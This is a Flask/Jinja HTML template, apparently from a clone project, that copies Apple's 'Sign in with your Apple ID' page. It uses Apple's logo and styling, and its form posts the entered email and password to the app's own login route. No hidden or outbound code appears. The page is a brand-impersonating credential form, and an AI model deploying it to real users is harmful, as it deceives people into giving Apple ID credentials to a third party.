<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Apple ID – Sign In</title>
    <style>
      *,
      *::before,
      *::after {
        box-sizing: border-box;
        margin: 0;
        padding: 0;
      }

      :root {
        --bg: #f5f5f7;
        --white: #ffffff;
        --ink: #1d1d1f;
        --muted: #6e6e73;
        --border: #d2d2d7;
        --blue: #0071e3;
        --blue-h: #0077ed;
        --input-bg: #ffffff;
        --ease: cubic-bezier(0.4, 0, 0.2, 1);
      }

      body {
        font-family:
          -apple-system, BlinkMacSystemFont, "Helvetica Neue", sans-serif;
        background: var(--bg);
        min-height: 100vh;
        display: flex;
        flex-direction: column;
        -webkit-font-smoothing: antialiased;
      }

      .topnav {
        display: flex;
        align-items: center;
        justify-content: space-between;
        padding: 0 1.5rem;
        height: 44px;
        background: rgba(245, 245, 247, 0.85);
        backdrop-filter: saturate(180%) blur(20px);
        border-bottom: 1px solid rgba(0, 0, 0, 0.08);
        flex-shrink: 0;
      }

      .topnav-brand {
        color: #1d1d1f;
        display: flex;
        align-items: center;
        text-decoration: none;
        opacity: 0.85;
        transition: opacity 0.2s;
      }
      .topnav-brand:hover {
        opacity: 1;
      }

      .back-home {
        display: flex;
        align-items: center;
        gap: 0.3rem;
        font-size: 0.75rem;
        color: var(--blue);
        text-decoration: none;
        transition: opacity 0.2s;
      }
      .back-home:hover {
        opacity: 0.75;
      }
      .back-home svg {
        transition: transform 0.2s;
      }
      .back-home:hover svg {
        transform: translateX(-2px);
      }

      .page {
        flex: 1;
        display: flex;
        align-items: center;
        justify-content: center;
        padding: 3rem 1.5rem;
        animation: riseUp 0.5s var(--ease) 0.1s both;
      }

      @keyframes riseUp {
        from {
          opacity: 0;
          transform: translateY(16px);
        }
        to {
          opacity: 1;
          transform: translateY(0);
        }
      }

      .card {
        background: var(--white);
        border-radius: 18px;
        padding: 2.8rem 2.6rem 2.4rem;
        width: 100%;
        max-width: 420px;
        box-shadow:
          0 2px 12px rgba(0, 0, 0, 0.06),
          0 0 0 1px rgba(0, 0, 0, 0.04);
      }

      .card-logo {
        display: flex;
        justify-content: center;
        margin-bottom: 1.4rem;
        color: var(--ink);
        opacity: 0.9;
      }

      .card-title {
        font-size: 1.6rem;
        font-weight: 600;
        letter-spacing: -0.02em;
        color: var(--ink);
        text-align: center;
        margin-bottom: 0.35rem;
      }

      .card-sub {
        font-size: 0.85rem;
        color: var(--muted);
        text-align: center;
        margin-bottom: 2rem;
        line-height: 1.5;
      }

      .alert {
        padding: 10px;
        border-radius: 8px;
        font-size: 0.85rem;
        margin-bottom: 1rem;
        text-align: center;
        background: #ffe5e5;
        color: #ff3b30;
        border: 1px solid #ffcccc;
      }

      .field {
        margin-bottom: 0.9rem;
      }

      .field input {
        width: 100%;
        background: var(--input-bg);
        border: 1px solid var(--border);
        border-radius: 10px;
        padding: 0.82rem 1rem;
        font-family: inherit;
        font-size: 0.9rem;
        color: var(--ink);
        outline: none;
        transition:
          border-color 0.2s,
          box-shadow 0.2s;
        -webkit-appearance: none;
      }
      .field input::placeholder {
        color: #b0b0b5;
      }
      .field input:focus {
        border-color: var(--blue);
        box-shadow: 0 0 0 3px rgba(0, 113, 227, 0.15);
      }

      .pw-wrap {
        position: relative;
      }
      .pw-wrap input {
        padding-right: 2.8rem;
      }
      .pw-toggle {
        position: absolute;
        right: 0.9rem;
        top: 50%;
        transform: translateY(-50%);
        background: none;
        border: none;
        cursor: pointer;
        color: #b0b0b5;
        display: flex;
        align-items: center;
        transition: color 0.2s;
      }
      .pw-toggle:hover {
        color: var(--muted);
      }

      .row-check {
        display: flex;
        align-items: center;
        justify-content: space-between;
        margin: 0.8rem 0 1.4rem;
      }

      .check-label {
        display: flex;
        align-items: center;
        gap: 0.5rem;
        font-size: 0.8rem;
        color: var(--muted);
        cursor: pointer;
        user-select: none;
      }

      .check-label input[type="checkbox"] {
        appearance: none;
        -webkit-appearance: none;
        width: 16px;
        height: 16px;
        background: var(--input-bg);
        border: 1.5px solid var(--border);
        border-radius: 4px;
        cursor: pointer;
        position: relative;
        flex-shrink: 0;
        transition:
          background 0.15s,
          border-color 0.15s;
        padding: 0;
      }
      .check-label input:checked {
        background: var(--blue);
        border-color: var(--blue);
      }
      .check-label input:checked::after {
        content: "";
        position: absolute;
        left: 4px;
        top: 1.5px;
        width: 5px;
        height: 8px;
        border: 1.5px solid #fff;
        border-top: none;
        border-left: none;
        transform: rotate(45deg);
      }

      .forgot {
        font-size: 0.78rem;
        color: var(--blue);
        text-decoration: none;
      }
      .forgot:hover {
        text-decoration: underline;
      }

      .btn-submit {
        width: 100%;
        background: var(--blue);
        color: #fff;
        border: none;
        border-radius: 10px;
        padding: 0.88rem;
        font-family: inherit;
        font-size: 0.9rem;
        font-weight: 500;
        cursor: pointer;
        letter-spacing: -0.01em;
        transition:
          background 0.2s,
          transform 0.15s;
        -webkit-appearance: none;
      }
      .btn-submit:hover {
        background: var(--blue-h);
        transform: scale(1.01);
      }
      .btn-submit:active {
        transform: scale(0.99);
      }

      .or {
        display: flex;
        align-items: center;
        gap: 0.75rem;
        margin: 1.3rem 0;
        color: #d2d2d7;
        font-size: 0.72rem;
        letter-spacing: 0.05em;
      }
      .or::before,
      .or::after {
        content: "";
        flex: 1;
        height: 1px;
        background: var(--border);
      }

      .btn-social {
        width: 100%;
        background: var(--input-bg);
        border: 1px solid var(--border);
        border-radius: 10px;
        padding: 0.78rem 1rem;
        font-family: inherit;
        font-size: 0.85rem;
        color: var(--ink);
        cursor: pointer;
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 0.6rem;
        transition: background 0.2s;
        text-decoration: none;
        margin-bottom: 0.65rem;
      }
      .btn-social:hover {
        background: #f5f5f7;
      }
      .btn-social:last-of-type {
        margin-bottom: 0;
      }

      .card-footer {
        margin-top: 1.5rem;
        padding-top: 1.4rem;
        border-top: 1px solid rgba(0, 0, 0, 0.06);
        font-size: 0.78rem;
        color: var(--muted);
        text-align: center;
      }
      .card-footer a {
        color: var(--blue);
        text-decoration: none;
      }
      .card-footer a:hover {
        text-decoration: underline;
      }

      .fine-print {
        margin-top: 2rem;
        font-size: 0.7rem;
        color: #aeaeb2;
        text-align: center;
        line-height: 1.6;
        padding: 0 0.5rem;
      }
      .fine-print a {
        color: var(--blue);
        text-decoration: none;
      }

      @media (max-width: 480px) {
        .card {
          padding: 2rem 1.5rem;
          border-radius: 14px;
        }
      }
    </style>
  </head>
  <body>
    <nav class="topnav">
      <a class="topnav-brand" href="#">
        <svg width="14" height="17" viewBox="0 0 814 1000" fill="currentColor">
          <path
            d="M788.1 340.9c-5.8 4.5-108.2 62.2-108.2 190.5 0 148.4 130.3 200.9 134.2 202.2-.6 3.2-20.7 71.9-68.7 141.9-42.8 61.6-87.5 123.1-155.5 123.1s-85.5-39.5-164-39.5c-76 0-103.7 40.8-165.9 40.8s-105-37.5-155.5-127.4C46 790.3-.5 672.5-.5 565.5c0-179.4 116.9-274.7 232.2-274.7 63 0 115.3 41.4 154.9 41.4 38.2 0 98.2-44.1 173.3-44.1 27.7 0 108.2 2.6 158.9 98.7zm-234.5-185.8c31.1-36.9 53.1-88.1 53.1-139.3 0-7.1-.6-14.3-1.9-20.1-50.6 1.9-110.8 33.7-147.1 75.8-28.5 32.4-55.1 83.6-55.1 135.5 0 7.8 1.3 15.6 1.9 18.1 3.2.6 8.4 1.3 13.6 1.3 45.4 0 102.5-30.4 135.5-71.3z"
          />
        </svg>
      </a>
      <a href="{{ url_for('index') }}" class="back-home">
        <svg
          width="12"
          height="12"
          viewBox="0 0 24 24"
          fill="none"
          stroke="currentColor"
          stroke-width="2.2"
          stroke-linecap="round"
          stroke-linejoin="round"
        >
          <polyline points="15 18 9 12 15 6" />
        </svg>
        Back
      </a>
    </nav>

    <div class="page">
      <div class="card">
        <div class="card-logo">
          <svg
            width="38"
            height="46"
            viewBox="0 0 814 1000"
            fill="currentColor"
          >
            <path
              d="M788.1 340.9c-5.8 4.5-108.2 62.2-108.2 190.5 0 148.4 130.3 200.9 134.2 202.2-.6 3.2-20.7 71.9-68.7 141.9-42.8 61.6-87.5 123.1-155.5 123.1s-85.5-39.5-164-39.5c-76 0-103.7 40.8-165.9 40.8s-105-37.5-155.5-127.4C46 790.3-.5 672.5-.5 565.5c0-179.4 116.9-274.7 232.2-274.7 63 0 115.3 41.4 154.9 41.4 38.2 0 98.2-44.1 173.3-44.1 27.7 0 108.2 2.6 158.9 98.7zm-234.5-185.8c31.1-36.9 53.1-88.1 53.1-139.3 0-7.1-.6-14.3-1.9-20.1-50.6 1.9-110.8 33.7-147.1 75.8-28.5 32.4-55.1 83.6-55.1 135.5 0 7.8 1.3 15.6 1.9 18.1 3.2.6 8.4 1.3 13.6 1.3 45.4 0 102.5-30.4 135.5-71.3z"
            />
          </svg>
        </div>

        <h1 class="card-title">Sign in</h1>
        <p class="card-sub">with your Apple ID</p>

        <!-- ✅ Flash messages from Flask -->
        {% with messages = get_flashed_messages(with_categories=true) %} {% if
        messages %} {% for category, message in messages %}
        <div class="alert alert-{{ category }}">{{ message }}</div>
        {% endfor %} {% endif %} {% endwith %}

        <!-- ✅ เพิ่ม <form> ครอบทุกช่อง -->
        <form action="{{ url_for('login') }}" method="POST">
          <!-- ✅ เพิ่ม name attribute -->
          <div class="field">
            <input
              type="email"
              name="email"
              id="email"
              placeholder="Apple ID (Email)"
              required
            />
          </div>

          <div class="field">
            <div class="pw-wrap">
              <!-- ✅ เพิ่ม name attribute -->
              <input
                type="password"
                name="password"
                id="password"
                placeholder="Password"
                required
              />
              <button
                type="button"
                class="pw-toggle"
                id="pwToggle"
                aria-label="Show password"
              >
                <svg
                  id="eyeIcon"
                  width="16"
                  height="16"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  stroke-width="1.8"
                >
                  <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z" />
                  <circle cx="12" cy="12" r="3" />
                </svg>
              </button>
            </div>
          </div>

          <div class="row-check">
            <label class="check-label">
              <input type="checkbox" id="remember" name="remember" /> Keep me
              signed in
            </label>
            <a href="#" class="forgot">Forgot Apple ID or password?</a>
          </div>

          <!-- ✅ เพิ่ม type="submit" -->
          <button type="submit" class="btn-submit">Continue</button>
        </form>

        <!-- ✅ เปลี่ยนเป็น url_for -->
        <div class="card-footer">
          Don't have an Apple ID?
          <a href="{{ url_for('signup') }}">Create yours now.</a>
        </div>
      </div>
    </div>

    <script>
      document.getElementById("pwToggle").addEventListener("click", () => {
        const inp = document.getElementById("password");
        const icon = document.getElementById("eyeIcon");
        const show = inp.type === "password";
        inp.type = show ? "text" : "password";
        icon.innerHTML = show
          ? `<path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/>`
          : `<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>`;
      });
    </script>
  </body>
</html>
